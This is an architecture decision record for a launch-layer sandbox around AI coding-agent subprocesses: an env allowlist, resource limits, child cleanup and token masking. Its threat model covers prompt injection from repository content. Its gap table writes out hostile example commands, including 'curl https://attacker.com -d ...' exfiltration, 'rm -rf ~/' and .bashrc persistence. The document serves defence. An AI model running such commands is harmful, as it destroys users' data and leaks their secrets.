# ADR 0034 — Sandbox Isolation, Launch-Layer L1

- **Status:** Accepted. L1 launch-layer hygiene shipped. The
  schema accepts ``mode: off`` and ``mode: env`` and nothing
  else. There are no reserved enum slots for native-FS / network /
  container backends; if one of those is needed later, the schema
  widens then.
- **Date:** 2026-05-22
- **Deciders:** project owner
- **Companion to:** [ADR 0033](0033-worktree-foundation.md) — git
  worktree isolation gives the agent a private working tree but
  does not constrain env, resources, or output channels. This ADR
  layers launch-time process hygiene on top of GWT-1.

## Context

Today the agent subprocess runs with the full inheritance of the
orcho parent:

- **Environment** — every variable in `os.environ` is passed
  through. A workstation that has `AWS_ACCESS_KEY_ID`,
  `SSH_AUTH_SOCK`, `GITHUB_TOKEN`, or arbitrary CI secrets in its
  shell exposes all of them to the agent process, where a
  prompt-injected instruction can read or echo them.
- **Resources** — no CPU, memory, file-descriptor, or output-size
  cap. A buggy or attacker-driven agent can fork-bomb the host,
  exhaust memory, or fill the disk.
- **Output channels** — anything the agent prints to stdout/stderr
  is captured verbatim into `output.log` and the run transcript.
  If a tool the agent invokes prints `ANTHROPIC_API_KEY=sk-ant-…`,
  that secret is preserved in plaintext in the artefact bundle and
  in any shared run logs.
- **Process tree** — orphaned subprocesses survive parent exit on
  Unix without explicit pdeathsig / process-group handling, leaking
  background work between runs.

GWT-1 (ADR 0033) addressed *one* axis of this — the agent's
working tree is now isolated. It did not address env, resources,
output, or the broader OS surface (filesystem outside cwd, network
egress, syscall surface). Those are real attack paths under the
two threat models below.

### Threat model (PR1)

1. **Accidental damage by own agent.** The LLM mis-fires and emits
   `rm -rf ~/`, a fork bomb, or echoes a secret it read from env.
   Not adversarial — just a misaligned action with high blast
   radius. Worktree isolation catches the `git`/cwd subset;
   everything else (env, FS outside cwd, resource exhaustion)
   passes through.

2. **Prompt injection from repo content.** Issues, PR descriptions,
   committed code, or third-party diffs contain instructions that
   the agent follows. Adversarial in intent, but executed by *our*
   trusted agent process. The attacker's payload is bounded by what
   the agent process can do — so the goal is to make that envelope
   small.

Out of scope for this ADR: hostile third-party `orcho.skills`
plugins (those load *in* the orcho process and are a separate
trust boundary); multi-tenant isolation (different users sharing
a single orcho install).

### Boundary against runtime sandbox

Modern agent CLIs (Claude Code, Codex, etc.) ship their own
in-process sandbox: tool-call policy, file-access approvals,
command guardrails. orcho does **not** re-implement those.

L1 sits at a different layer — what enters the runtime CLI's
`os.environ` before it starts, what leaves through stdout /
stderr / log, what happens to grandchildren after a parent-side
timeout, and what the run manifest records about applied
protections. These rows are outside the runtime sandbox's
scope and therefore additive, not duplicate.

The corollary: when a runtime closes a row well, orcho does not
build a parallel sandbox for the same row.

## Decision

**Sandbox isolation is a single-layer L1 deliverable.** The
schema accepts ``mode: off`` (no isolation, escape hatch) and
``mode: env`` (L1 active) and nothing else. There is no
``network`` knob, no ``proxy`` block, no native-FS / container
enum slot. Unknown values fail at the resolver with a precise
"is not one of" error.

| Layer | What | Status | Cross-platform? |
|---|---|---|---|
| **L1** | env allowlist, resource limits, child-process cleanup, output token masking, capability detection | shipped | yes (env+rlimit Unix / env+Job Object Windows) |

### If a future backend ever lands

The schema does not reserve enum slots for backends orcho is not
building. Each of the rows below would land as a separate ADR +
a new enum value when its trigger materialises — never as the
activation of a pre-existing slot:

* **Native FS sandbox** (bwrap / sandbox-exec / AppContainer) —
  trigger: a runtime registered under `orcho.agent_runtimes`
  lacks its own in-process file-access policy *and* runs
  untrusted instructions. The agents we drive today already
  constrain file access at the runtime; layering an OS sandbox
  on top is duplicate work.
* **Network gating** — trigger: a concrete exfiltration pattern
  is observed in real runs *and* the runtime CLI does not gate
  egress at the API-call layer.
* **Container** — trigger: third-party `orcho.skills` plugins
  start loading arbitrary code into the orcho process. That is
  an in-process trust boundary, not a subprocess one, and a
  container is the only valid answer.

If none of these triggers materialise, the schema stays exactly
as small as it is today. Speculative reserved slots cost real
maintenance and invite the next person to "complete" them.

### What L1 does

1. **Environment allowlist.** Before spawning an agent subprocess,
   `os.environ` is filtered through a built-in allowlist plus
   profile-declared additions. Variables not in the union are
   stripped from the child's env. The built-in list covers what
   the agent CLI actually needs (`PATH`, `HOME`, `LANG`, `LC_*`,
   `USER`, `TZ`, `SHELL`, `TMPDIR`, `TERM`, `NO_COLOR`,
   `FORCE_COLOR`, `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`,
   `GEMINI_API_KEY`, `GOOGLE_API_KEY`, `CLAUDE_BIN`, `CODEX_BIN`,
   `CODEX_HOME`, `ORCHO_*`). A `denylist` field always wins
   over allowlist so an operator can strip a value that
   matched a wildcard.

2. **Resource limits.** Per-agent caps on CPU-seconds, RSS,
   open-file count, and per-file size. Implemented via
   `resource.setrlimit` in a `preexec_fn` on Unix; via Job Object
   `JOBOBJECT_BASIC_LIMIT_INFORMATION` (`PerProcessUserTimeLimit`,
   `ProcessMemoryLimit`, `ActiveProcessLimit`) on Windows. A
   limit hit kills the child; the run records the limit and the
   value that tripped it.

3. **Child-process cleanup.** Agent and its grandchildren die when
   orcho dies. Unix: `setpgrp()` in `preexec_fn` (so the agent
   gets its own process group) + group SIGKILL on parent abort
   (a separate L1 invariant from worktree timeouts). Linux gets
   `PR_SET_PDEATHSIG=SIGTERM` via `prctl` for belt-and-braces.
   Windows: Job Object with
   `JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE` — which is automatic and
   stronger than the Unix equivalent (kernel-level on parent
   handle close, no signal race).

4. **Output token masking.** A `TokenMasker` is wired into the
   stream pipeline (`agents/stream.py`) before the chunk reaches
   `output.log` or stdout echo. Built-in patterns cover the
   agent providers we support today: `sk-ant-…` (Anthropic),
   `sk-…` (OpenAI / Codex), `AIza…` (Google / Gemini). Custom
   patterns extend the set per profile. The same masking
   applies to stderr capture. Returned stdout (used by runtime
   parsers) stays raw — masking would break JSON-event parsing.
   Mask format is `***MASKED***` with no length leak.

5. **Capability detection.** At run init, the engine records the
   platform string and probes the `pywin32` import (required by
   the Windows Job Object backend). Results land in the run
   manifest under `sandbox.capabilities`. The probe is
   deliberately narrow — only what L1 actually consumes is
   recorded. Probing primitives for backends orcho is not
   building (bwrap, sandbox-exec, podman) would imply we plan
   to use them.

### What L1 does *not* do

L1 is a necessary minimum, not a sufficient defence on its own.
The honest gap table:

| Attack | L1 blocks? | Who closes it |
|---|---|---|
| Agent reads `AWS_SECRET_ACCESS_KEY` from env | **yes** if not in allowlist | L1 |
| Agent echoes provider API key into log | **yes** (masked) | L1 |
| Fork bomb / OOM / disk fill | **yes** (rlimit / Job Object) | L1 |
| Agent runs `rm -rf ~/` | no | runtime sandbox (file-access policy) |
| Agent runs `git push --force` into user's private repo | no | runtime sandbox + worktree (ADR 0033) |
| Agent exfiltrates via `curl https://attacker.com -d ...` | no | runtime sandbox (egress at API layer) |
| Agent writes to `~/.bashrc` for persistence | no | runtime sandbox (file-access policy) |
| Hostile third-party skill executes inside orcho | no | not covered today; new ADR if triggered |

The "no" rows are out of L1's scope. Most are already closed by
the runtime sandbox shipped with the agent CLIs we drive (Claude
Code, Codex). The worktree isolation from ADR 0033 covers the
destructive-git subset. **L1 + worktree + runtime sandbox** is
the full defence stack today; if a runtime stops covering a row
later, that triggers its own ADR — not the activation of a
pre-reserved slot.

### Lifecycle

1. **Run init.** The orchestrator calls
   `pipeline.sandbox.resolver.resolve_sandbox_policy(global_config,
   profile)` which returns a frozen `SandboxPolicy`. The resolver:
   - reads `mode` from profile if set, else global config, else
     default `env`;
   - accepts only the values the L1 backend implements (`off`,
     `env`); unknown enum values fail with a precise error;
   - merges built-in env allowlist with profile-declared
     additions; applies profile-declared denylist last;
   - returns a `SandboxPolicy` with the L1 components resolved.
2. **Active policy.** Orchestrator calls
   `set_active_sandbox_policy(policy)` — sets a ContextVar
   (mirror of GWT-1's `_active_checkout`). Agent runtimes read
   it via `get_active_sandbox_policy()`. Per-thread isolation
   for parallel sub-runs.
3. **Agent dispatch.** `_stream_run` (the PTY streamer) accepts
   a `sandbox_policy: SandboxPolicy | None` parameter. When set,
   the streamer uses a `SandboxLauncher` to compute env,
   `preexec_fn`, and (Windows) the post-spawn Job Object
   assignment before invoking `subprocess.Popen`. The token
   masker is applied to every chunk before it lands in
   `output.log` and the live echo. Returned stdout stays raw.
4. **Limit hit.** rlimit / Job Object kills the child; the run
   records `sandbox.limit_hit = { kind, value, configured }` in
   evidence. Caller treats it as a non-retryable failure (same
   class as wall-clock timeout).
5. **Run completion.** Policy + capabilities + any limit hits
   land in `meta.json.sandbox`.

### Wire shape

`meta.json` gains:

```jsonc
{
  "sandbox": {
    "mode": "env",
    "limits": {
      "cpu_seconds": 600,
      "memory_mb": 4096,
      "open_files": 1024,
      "file_size_mb": 1024
    },
    "env_allowlist_effective": ["PATH", "HOME", "..."],
    "env_stripped_count": 47,
    "masking": { "builtin": true, "custom_patterns": 0 },
    "capabilities": {
      "platform": "linux",
      "pywin32": false
    },
    "limit_hit": null
  }
}
```

`env_stripped_count` records how many parent env variables were
filtered out (not the names — that would leak the existence of
secrets). This is useful for the operator to spot misconfigured
allowlists ("orcho stripped 200 variables, my agent probably
needed something"). `capabilities.pywin32` is detected because
the Windows Job Object backend depends on it; primitives for
backends orcho is not building (bwrap, sandbox-exec, podman) are
not probed — probing them would imply we plan to use them.

### Config

A new `sandbox` section in `config.defaults.json`:

```jsonc
{
  "sandbox": {
    "mode": "env",
    "env_allowlist": [],
    "env_denylist": [],
    "limits": {
      "cpu_seconds": 0,
      "memory_mb": 0,
      "open_files": 0,
      "file_size_mb": 0
    },
    "masking": {
      "builtin_patterns": true,
      "custom_patterns": []
    }
  }
}
```

`cpu_seconds=0` (and other `0`s) means "no limit", matching the
existing `timeouts.*_seconds=0` convention in this file. The
allowlist additions are added to the built-in list, not
replacing it — operators add specific extras, they do not need
to re-enumerate the basics.

### Profile schema

A new optional `sandbox` block per profile mirrors the global
shape and overrides field-by-field:

```jsonc
{
  "name": "full_cycle_deep",
  "sandbox": {
    "mode": "env",
    "limits": { "memory_mb": 8192 },
    "env_allowlist": ["MY_PROJECT_TOKEN"]
  }
}
```

`mode` accepts `off` (no L1) and `env` (L1 active). Unknown values
are rejected at profile-load time, not deferred to run init. There
is no `network` / `proxy` knob — orcho does not gate network
egress; runtimes do that at the API-call layer.

## Consequences

**Adds** a process-hygiene primitive that closes the
secret-leak / fork-bomb / output-leak failure modes universally
across the three target platforms, and stays out of the way of
the runtime sandbox where the runtime already covers a row.

**Couples** every agent runtime adapter to one extra read of
`get_active_sandbox_policy()` and one extra `_stream_run`
parameter pass-through. The same parameter is `None` by default
so direct unit tests of `_stream_run` keep working unchanged.

**Surfaces** a `pywin32` dependency on Windows for Job Object
support. Conditional dependency: `pywin32; sys_platform ==
"win32"`. No effect on Linux/macOS installs.

**Expects** operators to add project-specific tokens to
`env_allowlist` when the agent needs them (e.g. private registry
credentials, custom CI variables). The default allowlist is
deliberately narrow — broadening it would hide L1's value. The
run manifest's `env_stripped_count` gives operators the signal
they need to tune.

## Out of scope

- **Native FS / network / container backends.** Not built and
  not reserved in schema. If a concrete trigger surfaces (see
  "If a future backend ever lands" above), each is its own ADR
  with its own new enum value — never the activation of a
  pre-existing slot.
- **Defence-in-depth duplication of runtime sandbox.** orcho L1
  does not re-implement tool-call policy, file-access approvals,
  or in-process command guards. Those belong to the agent CLI.
- **CI matrix** — verifying the three OS variants in GitHub
  Actions. Tests gate on `platform.system()` so the suite stays
  green on whichever OS the developer runs it. CI matrix lands
  separately.
- **Multi-tenant isolation** — different OS users sharing one
  orcho install. Not in this ADR's threat model; would need
  rethinking of the worktree storage layout, not just the
  sandbox layer.
- **Token masking entropy detector** — only fixed regex patterns
  ship. An entropy-based fallback (catch arbitrary high-entropy
  strings) is a separate feature with a non-trivial false-positive
  story (hashes, UUIDs, base64 payloads).

## References

- [ADR 0033](0033-worktree-foundation.md) — git worktree isolation
  (GWT-1), the sibling primitive that this ADR layers process
  hygiene on top of.
- `pipeline/sandbox/` — module added by this ADR.
- `agents/stream.py:_stream_run` — integration point for env /
  preexec / masking.
